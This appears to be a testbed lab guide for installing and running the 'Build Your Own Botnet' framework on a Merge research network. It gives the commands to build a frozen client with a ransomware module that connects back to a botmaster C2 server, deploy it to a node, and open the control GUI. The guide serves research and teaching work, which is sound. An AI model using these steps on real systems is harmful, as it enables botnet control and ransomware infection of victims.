# BYOB

This page describes how we install and use [Build Your Own Botnet](https://github.com/STEELISI/byob/) on a Merge testbed

## Prerequisites

Run this script in your XDC:

```shell
sudo bash xdc/init-xdc-defaults.sh
```

## Installation

Run this ansible playbook in **your XDC** to download and install BYOB. There are a few assumptions currently:
1. You are using the `testbotenv` topology shown here: https://launch.mod.deterlab.net/project/discern/experiment/testbotenv
2. You only want to install BYOB on the `botmaster` node

To run the playbook, do:
```shell
cd ansible/
ansible-playbook -i inventories/testbotenv.ini setup-testbotenv.yml
```

## Example: Server/Client setup


### Building a client

We will use the `botmaster` node to generate a client. The client will have a ransomware
module built into it.

SSH to the botmaster node from your XDC
```shell
ssh botmaster
```

```shell
cd /opt/byob/byob.git/byob
python3 client.py --freeze botmaster.infra 1337 ransom
```

After this completes, you should see a line like the following:
```shell
(24,551,600 bytes saved to file: /opt/byob/byob.git/byob/dist/zGs)
```

We now scp this module to our home directory on the client (for example, `b1`):
```shell
scp dist/zGs b1.infra:
```

Lastly, startup the server
```shell
python3 server.py
```

### Staring the client

SSH from your XDC to the client (for example, `b1`):
```shell
ssh b1
```

Start the module that you scp'd above:
```
./zGs
```

At this point, the server should display a message like:
```
[+] Connection: 172.30.0.11
    Session: 0
    Started: Wed Nov  8 20:34:50 2023
```

## Running the GUI

There is also a GUI option that can be used on the server instead of the server.py command line
tool.  SSH to the `botmaster` node and execute this command and leave the server running:
```shell
cd /opt/byob/byob.git/web-gui
python3 run.py
```

### Accessing the BYOB GUI

Use SSH port forwarding to reach the GUI. From your local workstation:
```shell
mrg xdc ssh <your XDC> -L 8000:botmaster:5000
```

Then, from a web browser on your local machine, navigate to http://localhost:8000/
